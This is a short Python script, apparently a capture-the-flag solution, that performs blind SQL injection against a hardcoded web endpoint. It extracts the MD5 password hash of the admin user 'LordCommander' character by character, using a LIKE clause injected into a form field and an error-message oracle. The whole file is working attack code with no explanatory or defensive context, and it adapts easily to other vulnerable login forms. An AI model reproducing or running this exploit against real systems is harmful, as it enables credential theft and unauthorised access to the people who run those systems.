import requests
import string

indexPage = "http://163.172.176.29/WALL/index.php"

client = requests.Session()
password = ""
perm = string.digits + string.letters

while len(password) != 32:

    for i in perm:
        query = "LordCommander\' and LOWER(password) LIKE \'" + password + i + "%"
        
        payload = {'life':query, 'soul':'randomstring'}
        html = client.post(indexPage,data=payload).text

        if "No such person exists" in html:
            continue
        else:
            password += i
            print "Currently checking password: %s" % password
            print "Current length of password: %d" % len(password)

print "Admin's username is LordCommander and the password (in md5) is %s" % password
